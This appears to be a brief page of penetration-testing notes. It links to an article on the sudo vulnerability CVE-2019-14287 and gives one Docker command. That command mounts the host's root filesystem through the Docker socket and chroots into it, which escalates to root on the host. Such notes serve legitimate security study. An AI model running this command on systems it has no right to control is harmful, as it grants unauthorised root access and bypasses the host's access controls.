# Interesting Findings

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption><p>sudo <a href="https://access.redhat.com/security/cve/cve-2019-14287">CVE-2019-14287</a></p></figcaption></figure>

Read more: [https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/](https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/)

## Docker

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```
